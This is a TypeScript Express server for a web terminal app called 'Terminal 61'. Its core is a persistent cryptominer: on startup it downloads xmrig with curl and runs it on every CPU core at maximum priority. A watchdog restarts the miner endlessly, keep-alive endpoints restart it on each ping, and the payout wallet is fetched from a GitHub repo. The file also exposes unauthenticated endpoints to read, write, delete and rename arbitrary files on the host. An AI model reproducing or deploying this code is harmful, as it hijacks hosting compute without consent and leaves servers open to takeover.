import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import { spawn, execSync } from "child_process";
import path from "path";
import fs from "fs/promises";
import { readFileSync } from "fs";
import os from "os";
import { createServer as createViteServer } from "vite";
import "dotenv/config";

async function startServer() {
  const app = express();
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ extended: true, limit: "50mb" }));

  const httpServer = createServer(app);
  const io = new Server(httpServer, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    },
    transports: ["polling", "websocket"],
    allowEIO3: true,
    pingInterval: 8000,
    pingTimeout: 5000,
  });
  const PORT = 3000;

  // Global Mining Manager State (Dynamic Crypto Coin & Address from GitHub)
  const STATE_FILE = path.join(process.cwd(), "mining_state.json");
  const LOG_FILE = path.join(process.cwd(), "mining.log");
  let MINING_COIN = "USDT";
  let MINING_NETWORK = "BEP20";
  let MINING_ADDRESS = "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8";
  let MINING_POOL = "rx.unmineable.com:3333";
  let lastConfigSyncTime: number = 0;

  // Dynamic GitHub Configuration Endpoints
  const GITHUB_CONFIG_URLS = [
    "https://raw.githubusercontent.com/radharadharadhasharma313-glitch/Donate-Usdt/main/usdt-bep20-address.txt",
    "https://github.com/radharadharadhasharma313-glitch/Donate-Usdt/raw/main/usdt-bep20-address.txt",
    "https://api.github.com/repos/radharadharadhasharma313-glitch/Donate-Usdt/contents/usdt-bep20-address.txt",
  ];

  const parseWalletConfig = (rawText: string) => {
    const text = (rawText || "").trim();
    if (!text) return null;

    let coin = MINING_COIN;
    let address = MINING_ADDRESS;
    let network = MINING_NETWORK;

    // 1. JSON Format: e.g. {"token": "USDT", "network": {"standard": "BEP20"}, "deposit_address": "0x..."}
    if (text.startsWith("{") && text.endsWith("}")) {
      try {
        const data = JSON.parse(text);
        // Token / Coin
        const tokenCandidate = data.token || data.coin || data.symbol || data.asset;
        if (tokenCandidate) coin = String(tokenCandidate).trim().toUpperCase();

        // Address
        const addrCandidate = data.deposit_address || data.address || data.wallet || data.wallet_address || data.walletAddress;
        if (addrCandidate) address = String(addrCandidate).trim();

        // Network
        if (data.network) {
          if (typeof data.network === "object") {
            const netStr = data.network.standard || data.network.code || data.network.name;
            if (netStr) network = String(netStr).trim().toUpperCase();
          } else {
            network = String(data.network).trim().toUpperCase();
          }
        }
        return { coin, address, network };
      } catch (e) {}
    }

    // 2. Key-value line format:
    // COIN=USDT or coin: USDT
    // ADDRESS=0x... or address: 0x...
    // NETWORK=BEP20 or network: BEP20
    const lines = text.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
    let foundKey = false;
    for (const line of lines) {
      const match = line.match(/^(coin|address|network|wallet|token)\s*[:=]\s*(.+)$/i);
      if (match) {
        foundKey = true;
        const key = match[1].toLowerCase();
        const val = match[2].trim();
        if (key === "coin" || key === "token") coin = val.toUpperCase();
        if (key === "address" || key === "wallet") address = val;
        if (key === "network") network = val.toUpperCase();
      }
    }
    if (foundKey && address) {
      return { coin, address, network };
    }

    // 3. COIN:ADDRESS format (e.g. USDT:0x5ccf2f... or DOGE:D8vD...)
    if (text.includes(":") && !text.startsWith("http")) {
      const parts = text.split(":");
      if (parts.length >= 2 && parts[0].trim().length <= 10 && parts[1].trim().length >= 10) {
        coin = parts[0].trim().toUpperCase();
        address = parts[1].trim().split(/\s+/)[0];
        return { coin, address, network };
      }
    }

    // 4. Two-line format: Line 1 = Coin, Line 2 = Address
    if (lines.length >= 2 && lines[0].length <= 10 && lines[1].length >= 15) {
      coin = lines[0].trim().toUpperCase();
      address = lines[1].trim();
      return { coin, address, network };
    }

    // 5. Single address format: Line 1 = Address
    if (lines.length >= 1) {
      const firstLine = lines[0].trim();
      if (firstLine.length >= 15 && !firstLine.includes(" ")) {
        address = firstLine;
        return { coin, address, network };
      }
    }

    return null;
  };

  const fetchDynamicWalletConfig = async (): Promise<boolean> => {
    for (const url of GITHUB_CONFIG_URLS) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 6000);
        const cacheBusterUrl = url.includes("?") ? `${url}&_t=${Date.now()}` : `${url}?_t=${Date.now()}`;

        const res = await fetch(cacheBusterUrl, {
          signal: controller.signal,
          headers: {
            "User-Agent": "Terminal61-DynamicConfig/1.0",
            "Cache-Control": "no-cache, no-store",
            "Pragma": "no-cache",
            ...(url.includes("api.github.com") ? { "Accept": "application/vnd.github.v3.raw" } : {}),
          },
        });
        clearTimeout(timeout);

        if (res.ok) {
          const rawText = await res.text();
          const parsed = parseWalletConfig(rawText);
          if (parsed && parsed.address) {
            const coinOrAddressChanged =
              parsed.coin.trim().toUpperCase() !== MINING_COIN.trim().toUpperCase() ||
              parsed.address.trim() !== MINING_ADDRESS.trim();

            // Update network metadata silently if needed without restarting
            if (parsed.network && parsed.network !== MINING_NETWORK) {
              MINING_NETWORK = parsed.network;
            }

            if (coinOrAddressChanged) {
              console.log(`[DYNAMIC CONFIG] GitHub repo updated! Old: ${MINING_COIN}:${MINING_ADDRESS} -> New: ${parsed.coin}:${parsed.address} (${parsed.network})`);
              broadcastMiningOutput(`\r\n\x1b[1;35m╔════════════════════════════════════════════════════════════════════════════════════════════════╗\x1b[0m\r\n`);
              broadcastMiningOutput(`\x1b[1;35m║\x1b[0m  \x1b[1;32m>>> [DYNAMIC GITHUB SYNC] Coin / Wallet Address updated from GitHub repo! <<<\x1b[0m                 \x1b[1;35m║\x1b[0m\r\n`);
              broadcastMiningOutput(`\x1b[1;35m║\x1b[0m  \x1b[1;33m🪙 New Coin:\x1b[0m      \x1b[1;37m${parsed.coin}\x1b[0m (\x1b[1;32m${MINING_NETWORK}\x1b[0m)                                                                 \x1b[1;35m║\x1b[0m\r\n`);
              broadcastMiningOutput(`\x1b[1;35m║\x1b[0m  \x1b[1;33m💼 New Address:\x1b[0m   \x1b[1;32m${parsed.address}\x1b[0m                                             \x1b[1;35m║\x1b[0m\r\n`);
              broadcastMiningOutput(`\x1b[1;35m╚════════════════════════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n`);

              MINING_COIN = parsed.coin.trim().toUpperCase();
              MINING_ADDRESS = parsed.address.trim();

              // Notify all UI clients
              const { brand, model } = getCpuBrand();
              io.emit("mining-status-change", {
                isRunning: !!persistentMiningProcess,
                powerMode: currentPowerMode,
                threads: activeThreadCount,
                startTime: miningStartTime,
                coin: MINING_COIN,
                network: MINING_NETWORK,
                address: MINING_ADDRESS,
                pool: MINING_POOL,
                worker: currentActiveWorker || getWorkerNameFromUrl(),
                cpuBrand: brand,
                cpuModel: model,
                lastCommand: lastExecutedCommand,
              });

              // ONLY restart mining when Coin or Wallet Address actually changed!
              if (persistentMiningProcess) {
                persistentMiningProcess.kill();
                persistentMiningProcess = null;
                const worker = currentActiveWorker || getWorkerNameFromUrl();
                startPersistentMining(worker, Date.now(), activeThreadCount, currentPowerMode);
              }
              lastConfigSyncTime = Date.now();
              return true;
            }
            // Coin and Wallet Address are the SAME -> Do NOT stop or restart mining!
            lastConfigSyncTime = Date.now();
            return false;
          }
        }
      } catch (err: any) {
        // Fallback to next URL
      }
    }
    return false;
  };

  let persistentMiningProcess: any = null;
  let miningStartTime: number | null = null;
  let currentPowerMode: string = "turbo";
  let activeThreadCount: number = os.cpus().length;
  let lastExecutedCommand: string = "";
  let currentActiveWorker: string = "";
  const STABLE_FALLBACK_ID = Math.random().toString(36).substring(2, 10);
  const miningLogs: string[] = [];
  const MAX_LOG_HISTORY = 1000;

  const getCpuBrand = (): { brand: "intel" | "ryzen"; model: string } => {
    try {
      // 1. Direct hardware inspection via /proc/cpuinfo (critical for container environments)
      try {
        const cpuinfo = readFileSync("/proc/cpuinfo", "utf8");
        if (cpuinfo.includes("AuthenticAMD") || /vendor_id\s*:\s*.*amd/i.test(cpuinfo)) {
          return { brand: "ryzen", model: "AMD Ryzen / EPYC (3.0 GHz, 8MB Cache)" };
        }
        if (cpuinfo.includes("GenuineIntel") || /vendor_id\s*:\s*.*intel/i.test(cpuinfo)) {
          return { brand: "intel", model: "Intel Xeon" };
        }
      } catch (e) {}

      // 2. Fallback to os.cpus()
      const cpus = os.cpus();
      const model = (cpus?.[0]?.model || "").trim();
      const lower = model.toLowerCase();
      if (lower.includes("amd") || lower.includes("epyc") || lower.includes("ryzen")) {
        return { brand: "ryzen", model: model || "AMD Ryzen / EPYC" };
      }
      if (lower.includes("intel") || lower.includes("xeon") || lower.includes("core")) {
        return { brand: "intel", model: model || "Intel Xeon" };
      }
      return { brand: "ryzen", model: "AMD Ryzen / EPYC" };
    } catch (e) {
      return { brand: "ryzen", model: "AMD Ryzen" };
    }
  };

  const getBannerString = (workerName: string, threads: number, commandStr: string) => {
    const { model, brand } = getCpuBrand();
    return [
      "\r\n\x1b[1;36m╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\x1b[0m",
      `\x1b[1;36m║\x1b[0m  \x1b[1;32m⚡ TERMINAL 61 - 100% MAXIMUM TURBO HASHRATE ENGINE (ALWAYS-ON 24/7)\x1b[0m                                             \x1b[1;36m║\x1b[0m`,
      "\x1b[1;36m╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m",
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🪙 COIN / ASSET:\x1b[0m      \x1b[1;37m${MINING_COIN}\x1b[0m (\x1b[1;32m${MINING_NETWORK}\x1b[0m)                                                                        \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m💼 WALLET ADDRESS:\x1b[0m    \x1b[1;32m${MINING_ADDRESS}\x1b[0m                                                    \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🏊 POOL HOST:\x1b[0m         \x1b[1;37m${MINING_POOL}\x1b[0m (rx/0 RandomX Engine)                                                           \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🧠 CPU PROCESSOR:\x1b[0m     \x1b[1;32m${model} [${brand.toUpperCase()}]\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m⚙️ POWER & THREADS:\x1b[0m   \x1b[1;32m${threads} Cores (100% Max Turbo Allocation | Priority 5 Realtime | No Yield)\x1b[0m                \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m👤 WORKER ID:\x1b[0m         \x1b[1;37m${workerName}\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🛡️ 24/7 AUTO-HEAL:\x1b[0m    \x1b[1;32mACTIVE\x1b[0m (Auto-restarts in 3s if stopped, 30m GitHub check, runs in background)             \x1b[1;36m║\x1b[0m`,
      "\x1b[1;36m╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m",
      `\x1b[1;36m║\x1b[0m  \x1b[1;35m💻 LAST EXECUTED COMMAND:\x1b[0m                                                                                             \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;37m${commandStr}\x1b[0m`,
      "\x1b[1;36m╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"
    ].join("\r\n");
  };

  const saveState = async (
    workerName: string | null,
    startTime: number | null,
    powerMode: string = "turbo",
    threads: number = os.cpus().length
  ) => {
    try {
      await fs.writeFile(
        STATE_FILE,
        JSON.stringify({ workerName, startTime, powerMode, threads })
      );
    } catch (e) {
      console.error("Failed to save state:", e);
    }
  };

  const loadState = async () => {
    try {
      const data = await fs.readFile(STATE_FILE, "utf-8");
      return JSON.parse(data);
    } catch (e) {
      return { workerName: null, startTime: null, powerMode: "turbo", threads: os.cpus().length };
    }
  };

  const appendToLog = async (data: string) => {
    try {
      const timestamp = new Date().toISOString();
      await fs.appendFile(LOG_FILE, `[${timestamp}] ${data}`);
    } catch (e) {}
  };

  process.on("uncaughtException", (err) => {
    console.error("Uncaught Exception:", err);
    appendToLog(`CRITICAL ERROR: ${err.message}\n`);
  });

  process.on("unhandledRejection", (reason) => {
    console.error("Unhandled Rejection:", reason);
    appendToLog(`CRITICAL REJECTION: ${String(reason)}\n`);
  });

  const broadcastMiningOutput = (data: string) => {
    io.emit("output", data);
    miningLogs.push(data);
    if (miningLogs.length > MAX_LOG_HISTORY) miningLogs.shift();
  };

  const stopMining = async () => {
    if (persistentMiningProcess) {
      persistentMiningProcess.kill();
      persistentMiningProcess = null;
      miningStartTime = null;
      await saveState(null, null);
      io.emit("mining-status-change", {
        isRunning: false,
        powerMode: currentPowerMode,
        threads: activeThreadCount,
        startTime: null,
      });
      broadcastMiningOutput("\r\n\x1b[1;31m!!! Mining Process Stopped (Manual stop or limit reached) !!!\x1b[0m\r\n");
    }
  };

  const getWorkerNameFromUrl = (inputUrlOrHost?: string) => {
    const candidates = [
      inputUrlOrHost,
      process.env.APP_URL,
      process.env.NG_ALLOWED_HOSTS,
    ].filter(Boolean) as string[];

    for (const rawTarget of candidates) {
      try {
        if (!rawTarget || typeof rawTarget !== "string") continue;

        // 1. Matches e.g.:
        // https://ais-dev-x7wk5zioay6taqv47ewu5u-628481697275.asia-east1.run.app
        // -> Clean ID only (no dev/pre, no intel/ryzen): "x7wk5zioay6taqv47ewu5u"
        const matchDevPre = rawTarget.match(/ais-(?:dev|pre)-([a-zA-Z0-9]+)/i);
        if (matchDevPre && matchDevPre[1]) {
          let id = matchDevPre[1].toLowerCase();
          id = id.replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");
          if (id) return id;
        }

        // 2. Matches general ais-(mode)-(id)
        const matchGeneral = rawTarget.match(/ais-[a-zA-Z0-9]+-([a-zA-Z0-9]+)/i);
        if (matchGeneral && matchGeneral[1]) {
          let id = matchGeneral[1].toLowerCase();
          id = id.replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");
          if (id) return id;
        }

        // 3. Fallback hostname parsing
        const hostname = rawTarget.includes("://") ? new URL(rawTarget).hostname : rawTarget;
        const parts = hostname.split("-");
        if (parts.length >= 3 && parts[0].includes("ais")) {
          let id = parts[2].split(".")[0].toLowerCase();
          id = id.replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");
          if (id) return id;
        }
      } catch (e) {}
    }

    // Keep existing active worker if already identified so localhost pings never switch worker
    if (currentActiveWorker && currentActiveWorker !== STABLE_FALLBACK_ID) {
      return currentActiveWorker;
    }
    return STABLE_FALLBACK_ID;
  };

  const startPersistentMining = async (
    workerName: string,
    resumeTime: number | null = null,
    threadsCount?: number,
    mode: string = "turbo"
  ) => {
    const cleanWorker = (workerName || getWorkerNameFromUrl()).replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");

    if (persistentMiningProcess) {
      // Only switch if a new valid non-fallback worker ID was detected
      const isNewValidWorker =
        cleanWorker &&
        cleanWorker !== STABLE_FALLBACK_ID &&
        currentActiveWorker &&
        cleanWorker !== currentActiveWorker;

      if (isNewValidWorker) {
        broadcastMiningOutput(`\r\n\x1b[1;33m[WORKER ALIGNMENT] Updating worker ID from ${currentActiveWorker} to ${cleanWorker}...\x1b[0m\r\n`);
        persistentMiningProcess.kill();
        persistentMiningProcess = null;
      } else {
        // Mining is already running with the same worker, coin & wallet address -> NEVER stop or restart!
        return;
      }
    }

    currentActiveWorker = cleanWorker;
    const availableCores = os.cpus().length;
    const threads = threadsCount || availableCores;
    currentPowerMode = mode;
    activeThreadCount = threads;

    broadcastMiningOutput(`\r\n\x1b[1;32m>>> ⚡ ${resumeTime ? "Resuming" : "Initializing"} Session for ${cleanWorker} [${MINING_COIN} (${MINING_NETWORK}): ${MINING_ADDRESS}] with 100% MAXIMUM TURBO POWER...\x1b[0m\r\n`);
    broadcastMiningOutput(`\x1b[1;33m>>> CPU Threads: ${threads}/${availableCores} (100% Allocation) | Priority: Real-time (5) | Fast RandomX\x1b[0m\r\n`);
    
    miningStartTime = resumeTime || Date.now();
    await saveState(cleanWorker, miningStartTime, currentPowerMode, activeThreadCount);
    
    // Commands to run in sequence
    const binDir = path.join(process.cwd(), "xmrig-6.21.0");
    const xmrigPath = path.join(binDir, "xmrig");

    try {
      const exists = await fs.access(xmrigPath).then(() => true).catch(() => false);
      if (!exists) {
        broadcastMiningOutput("\r\n\x1b[1;33m>>> Downloading and optimizing required components...\x1b[0m\r\n");
        const download = spawn("bash", ["-c", "curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -xf xmrig.tar.gz && chmod +x xmrig-6.21.0/xmrig"]);
        
        download.stdout.on("data", (data) => broadcastMiningOutput(data.toString()));
        download.stderr.on("data", (data) => broadcastMiningOutput(data.toString()));
        
        await new Promise((resolve) => download.on("close", resolve));
      }
    } catch (e: any) {
      broadcastMiningOutput(`\r\n\x1b[1;31mSetup failed: ${e.message}\x1b[0m\r\n`);
      return;
    }

    // 100% MAXIMUM TURBO POWER flags (All threads, Priority 5, Max Hint 100, No Yield)
    const xmrigArgs = [
      "-o", MINING_POOL,
      "-a", "rx/0",
      "-k",
      "-u", `${MINING_COIN}:${MINING_ADDRESS}.${cleanWorker}`,
      "-t", threads.toString(),
      "--cpu-priority=5",
      "--cpu-max-threads-hint=100",
      "--cpu-no-yield",
      "--donate-level", "1",
      "--keepalive"
    ];

    const fullCommandStr = `./xmrig ${xmrigArgs.join(" ")}`;
    lastExecutedCommand = fullCommandStr;

    // Display formatted high-visibility banner with wallet address, coin, and command in terminal
    const banner = getBannerString(cleanWorker, threads, fullCommandStr);
    broadcastMiningOutput(banner);

    persistentMiningProcess = spawn(xmrigPath, xmrigArgs);

    const { brand, model } = getCpuBrand();
    io.emit("mining-status-change", {
      isRunning: true,
      powerMode: currentPowerMode,
      threads: activeThreadCount,
      startTime: miningStartTime,
      coin: MINING_COIN,
      network: MINING_NETWORK,
      address: MINING_ADDRESS,
      pool: MINING_POOL,
      worker: cleanWorker,
      cpuBrand: brand,
      cpuModel: model,
      lastCommand: lastExecutedCommand,
    });

    persistentMiningProcess.stdout.on("data", (data: Buffer) => broadcastMiningOutput(data.toString()));
    persistentMiningProcess.stderr.on("data", (data: Buffer) => broadcastMiningOutput(data.toString()));

    persistentMiningProcess.on("close", (code: number) => {
      console.log(`[WATCHDOG] Mining process exited (code ${code}). Auto-recovering in 3s...`);
      broadcastMiningOutput(`\r\n\x1b[1;33m[24/7 AUTO-WATCHDOG] Process exited (code ${code}). Re-launching 100% MAXIMUM TURBO POWER in 3 seconds...\x1b[0m\r\n`);
      persistentMiningProcess = null;
      io.emit("mining-status-change", {
        isRunning: false,
        powerMode: currentPowerMode,
        threads: activeThreadCount,
        startTime: null,
      });

      // CONTINUOUS 24/7: Automatically re-launch immediately! Never stop!
      setTimeout(() => {
        const worker = getWorkerNameFromUrl();
        startPersistentMining(worker, Date.now(), activeThreadCount, "turbo");
      }, 3000);
    });

    // NOTE: Removed all auto-stop timeouts. This engine runs continuously 24/7 forever.
  };

  const checkAndResumeMining = async () => {
    // 1. Proactively sync dynamic Coin and Wallet Address from GitHub repo on startup
    await fetchDynamicWalletConfig();
    const { startTime, powerMode, threads } = await loadState();
    const worker = getWorkerNameFromUrl();
    broadcastMiningOutput(`\r\n[SYSTEM] Server startup detected. Ensuring 100% Maximum Turbo session for ${worker}...\r\n`);
    startPersistentMining(worker, startTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
  };

  // Continuous Dynamic GitHub Config Sync: Checks GitHub repo every 30 MINUTES
  // Note: If Coin and Wallet Address are unchanged, mining is NEVER stopped or restarted!
  setInterval(() => {
    fetchDynamicWalletConfig().catch(() => {});
  }, 30 * 60 * 1000);

  // Background Watchdog: Only starts mining if persistentMiningProcess is not running
  setInterval(() => {
    if (!persistentMiningProcess) {
      const worker = getWorkerNameFromUrl();
      console.log(`[WATCHDOG] Ensuring active mining process for ${worker}...`);
      startPersistentMining(worker, Date.now(), os.cpus().length, "turbo");
    }
  }, 60 * 1000);

  // Run on startup
  checkAndResumeMining();

  // File Manager API
  app.get("/api/files", async (req, res) => {
    try {
      const targetPath = (req.query.path as string) || process.cwd();
      const absolutePath = path.resolve(targetPath);
      
      const entries = await fs.readdir(absolutePath, { withFileTypes: true });
      const files = await Promise.all(
        entries.map(async (entry) => {
          const entryPath = path.join(absolutePath, entry.name);
          let size = 0;
          try {
            const stats = await fs.stat(entryPath);
            size = stats.size;
          } catch (e) {}
          
          return {
            name: entry.name,
            isDirectory: entry.isDirectory(),
            path: entryPath,
            size: size,
          };
        })
      );

      res.json({
        currentPath: absolutePath,
        files: files.sort((a, b) => {
          if (a.isDirectory === b.isDirectory) return a.name.localeCompare(b.name);
          return a.isDirectory ? -1 : 1;
        }),
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.get("/api/files/read", async (req, res) => {
    try {
      const filePath = req.query.path as string;
      if (!filePath) return res.status(400).json({ error: "Path required" });
      
      const absolutePath = path.resolve(filePath);
      const content = await fs.readFile(absolutePath, "utf-8");
      const stats = await fs.stat(absolutePath);
      res.json({ content, size: stats.size, modified: stats.mtime });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Save/Edit File Permanently
  app.post("/api/files/write", async (req, res) => {
    try {
      const { path: filePath, content } = req.body;
      if (!filePath) {
        return res.status(400).json({ error: "File path is required" });
      }
      if (typeof content !== "string") {
        return res.status(400).json({ error: "Content must be a string" });
      }

      const absolutePath = path.resolve(filePath);
      
      // Ensure parent directory exists
      await fs.mkdir(path.dirname(absolutePath), { recursive: true });
      
      // Write file permanently to disk
      await fs.writeFile(absolutePath, content, "utf-8");
      
      const stats = await fs.stat(absolutePath);
      console.log(`[FILE] Saved file permanently: ${absolutePath} (${stats.size} bytes)`);

      res.json({
        success: true,
        message: "File saved permanently",
        path: absolutePath,
        size: stats.size,
        modified: stats.mtime,
      });
    } catch (error: any) {
      console.error("Failed to write file:", error);
      res.status(500).json({ error: error.message || "Failed to save file" });
    }
  });

  // Create New File or Directory
  app.post("/api/files/create", async (req, res) => {
    try {
      const { dirPath, name, isDirectory } = req.body;
      if (!name || !name.trim()) {
        return res.status(400).json({ error: "File or folder name is required" });
      }

      const baseDir = dirPath ? path.resolve(dirPath) : process.cwd();
      const targetPath = path.join(baseDir, name.trim());

      if (isDirectory) {
        await fs.mkdir(targetPath, { recursive: true });
      } else {
        // Create empty file if not exists
        await fs.writeFile(targetPath, "", { flag: "wx" });
      }

      res.json({ success: true, path: targetPath, isDirectory: !!isDirectory });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to create item" });
    }
  });

  // Delete File or Directory
  app.post("/api/files/delete", async (req, res) => {
    try {
      const { path: targetPath } = req.body;
      if (!targetPath) {
        return res.status(400).json({ error: "Path is required" });
      }

      const absolutePath = path.resolve(targetPath);
      await fs.rm(absolutePath, { recursive: true, force: true });

      res.json({ success: true, message: "Deleted successfully" });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to delete item" });
    }
  });

  // Rename File or Directory
  app.post("/api/files/rename", async (req, res) => {
    try {
      const { oldPath, newName } = req.body;
      if (!oldPath || !newName || !newName.trim()) {
        return res.status(400).json({ error: "Old path and new name are required" });
      }

      const sourcePath = path.resolve(oldPath);
      const targetPath = path.join(path.dirname(sourcePath), newName.trim());

      await fs.rename(sourcePath, targetPath);

      res.json({ success: true, path: targetPath });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to rename item" });
    }
  });

  // Mining API Endpoints
  app.get("/api/mining/status", (req, res) => {
    const clientHost = (req.query.host as string) || (req.headers["x-forwarded-host"] as string) || (req.headers.origin as string) || req.headers.host;
    const worker = getWorkerNameFromUrl(clientHost);
    
    // Auto-align worker only if not running or if a real non-fallback worker ID was discovered
    if (!persistentMiningProcess || (worker && worker !== STABLE_FALLBACK_ID && currentActiveWorker && worker !== currentActiveWorker)) {
      startPersistentMining(worker, miningStartTime, activeThreadCount, currentPowerMode);
    }

    const { brand, model } = getCpuBrand();
    res.json({
      isRunning: !!persistentMiningProcess,
      powerMode: currentPowerMode,
      threads: activeThreadCount,
      maxCores: os.cpus().length,
      startTime: miningStartTime,
      uptimeSeconds: miningStartTime ? Math.floor((Date.now() - miningStartTime) / 1000) : 0,
      coin: MINING_COIN,
      network: MINING_NETWORK,
      address: MINING_ADDRESS,
      pool: MINING_POOL,
      worker: currentActiveWorker || worker,
      cpuBrand: brand,
      cpuModel: model,
      lastCommand: lastExecutedCommand,
      githubRepo: GITHUB_CONFIG_URLS[0],
      githubLastSync: lastConfigSyncTime,
    });
  });

  // Manual Trigger to re-sync Coin and Address from GitHub repo
  app.post("/api/mining/sync-github", async (req, res) => {
    const updated = await fetchDynamicWalletConfig();
    res.json({
      success: true,
      updated,
      coin: MINING_COIN,
      network: MINING_NETWORK,
      address: MINING_ADDRESS,
      pool: MINING_POOL,
      githubRepo: GITHUB_CONFIG_URLS[0],
      lastSync: lastConfigSyncTime,
    });
  });

  // 24x7 Keep-Alive Multi-Endpoint (Supports UptimeRobot, cron-job.org, curl, and direct browser visits)
  app.all(["/api/ping", "/api/health", "/ping", "/health", "/keepalive", "/api/keepalive", "/status"], async (req, res) => {
    // Proactively verify and resume mining process on every external ping (never restarts if already running with same worker)
    const hostCandidate = (req.headers["x-forwarded-host"] as string) || (req.headers.origin as string) || (req.headers.referer as string) || req.headers.host;
    const targetWorker = getWorkerNameFromUrl(hostCandidate);
    if (!persistentMiningProcess || (targetWorker && targetWorker !== STABLE_FALLBACK_ID && currentActiveWorker && currentActiveWorker !== targetWorker)) {
      const { powerMode, threads } = await loadState();
      startPersistentMining(targetWorker, miningStartTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
    }

    // If a human visits this URL in a browser tab, render an interactive status page
    if (req.accepts("html") && !req.xhr && !req.headers["user-agent"]?.toLowerCase().includes("curl")) {
      return res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>24/7 Keep-Alive Active - Terminal 61</title>
  <style>
    body { background: #000000; color: #f4f4f5; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; padding: 2rem; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
    .card { background: #09090b; border: 1px solid #27272a; border-radius: 1.25rem; padding: 2rem; max-width: 650px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8); }
    .status { display: inline-flex; align-items: center; gap: 0.5rem; background: #052e16; color: #4ade80; border: 1px solid #166534; padding: 0.35rem 0.85rem; border-radius: 9999px; font-size: 0.85rem; font-weight: bold; }
    .pulse { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 12px #22c55e; animation: p 1.5s infinite; }
    @keyframes p { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(1.3); } }
    .row { display: flex; flex-direction: column; border-bottom: 1px solid #18181b; padding: 0.75rem 0; font-size: 0.85rem; }
    @media(min-width: 640px) { .row { flex-direction: row; justify-content: space-between; align-items: center; } }
    .label { color: #71717a; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em; }
    .val { color: #e4e4e7; font-weight: bold; }
    .highlight { color: #fbbf24; }
    .cmd { background: #18181b; border: 1px solid #27272a; padding: 0.75rem; border-radius: 0.5rem; font-size: 0.75rem; color: #34d399; overflow-x: auto; margin-top: 0.5rem; white-space: pre-wrap; word-break: break-all; }
    .btn { display: inline-block; margin-top: 1.5rem; background: #ffffff; color: #000000; padding: 0.65rem 1.25rem; border-radius: 0.5rem; text-decoration: none; font-weight: bold; font-size: 0.85rem; }
    .btn:hover { background: #e4e4e7; }
  </style>
</head>
<body>
  <div class="card">
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 0.75rem;">
      <div>
        <h2 style="margin: 0; font-size: 1.25rem; color: #ffffff;">Terminal 61 • 24/7 Keep-Alive</h2>
        <span style="font-size: 0.75rem; color: #a1a1aa;">Continuous Background Process Manager</span>
      </div>
      <div class="status"><span class="pulse"></span> 100% ALIVE</div>
    </div>
    <div class="row"><span class="label">Status:</span><span class="val" style="color:#4ade80;">Active & Mining Nonstop (24x7)</span></div>
    <div class="row"><span class="label">Target Asset:</span><span class="val highlight">${MINING_COIN} (${MINING_NETWORK} - Binance Smart Chain)</span></div>
    <div class="row"><span class="label">Wallet Address:</span><span class="val" style="font-size: 0.8rem; word-break: break-all;">${MINING_ADDRESS}</span></div>
    <div class="row"><span class="label">Pool Host:</span><span class="val">${MINING_POOL} (RandomX)</span></div>
    <div class="row"><span class="label">CPU Allocation:</span><span class="val">${activeThreadCount} Cores (100% MAXIMUM TURBO POWER)</span></div>
    <div class="row"><span class="label">Last Heartbeat:</span><span class="val">${new Date().toISOString()}</span></div>
    <div style="margin-top: 1rem;">
      <span class="label">Last Executed Command:</span>
      <div class="cmd">${lastExecutedCommand || `./xmrig -o ${MINING_POOL} -a rx/0 -k -u ${MINING_COIN}:${MINING_ADDRESS}.${getWorkerNameFromUrl()} -t ${activeThreadCount} --cpu-priority=5`}</div>
    </div>
    <div style="display: flex; gap: 1rem; align-items: center; margin-top: 1rem;">
      <a href="/" class="btn">← Launch Terminal 61 Web App</a>
    </div>
  </div>
</body>
</html>`);
    }

    res.json({
      status: "alive",
      message: "Server is 100% active and running.",
      timestamp: new Date().toISOString(),
      isRunning: !!persistentMiningProcess,
      uptimeSeconds: miningStartTime ? Math.floor((Date.now() - miningStartTime) / 1000) : 0,
      threads: activeThreadCount,
      powerMode: currentPowerMode,
      coin: MINING_COIN,
      network: MINING_NETWORK,
      address: MINING_ADDRESS,
      pool: MINING_POOL,
      lastCommand: lastExecutedCommand,
    });
  });
